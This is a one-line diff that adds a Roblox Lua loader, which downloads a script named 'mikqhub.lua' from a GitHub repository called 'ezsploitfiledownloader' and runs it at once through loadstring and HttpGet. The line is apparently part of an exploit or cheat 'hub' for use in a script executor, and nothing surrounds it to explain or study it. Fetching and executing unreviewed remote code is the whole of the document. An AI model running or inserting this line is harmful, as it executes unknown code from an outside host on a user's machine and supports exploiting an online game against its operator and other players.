@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikusgszyp/ezsploitfiledownloader/main/mikqhub.lua", true))()
